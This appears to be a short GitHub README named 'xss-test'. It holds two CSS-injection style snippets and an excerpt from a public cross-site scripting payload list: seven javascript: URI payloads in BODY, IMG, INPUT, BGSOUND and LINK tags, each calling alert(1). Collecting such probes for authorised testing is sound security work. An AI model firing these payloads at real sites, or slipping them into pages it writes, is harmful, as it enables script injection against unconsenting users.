# xss-test
xss



<div style="font-family:'foo&#10;;color:red;';">XXX

<div style="font-family:foo}color=red;">HOLA


```
<!-- Project Name  : Cross Site Scripting ( XSS ) Vulnerability Payload List -->
<!--        Author : Ismail Tasdelen -->
<!--      Linkedin : https://www.linkedin.com/in/ismailtasdelen/ -->
<!--        GitHub : https://github.com/ismailtasdelen/ -->
<!--       Twitter : https://twitter.com/ismailtsdln -->
<!--        Medium : https://medium.com/@ismailtasdelen -->

<BODY ONLOAD=javascript:javascript:alert(1)>
<IMG SRC="javascript:javascript:alert(1)"
<INPUT TYPE="IMAGE" SRC="javascript:javascript:alert(1);">
<IMG DYNSRC="javascript:javascript:alert(1)">
<IMG LOWSRC="javascript:javascript:alert(1)">
<BGSOUND SRC="javascript:javascript:alert(1);">
<LINK REL="stylesheet" HREF="javascript:javascript:alert(1);">


```
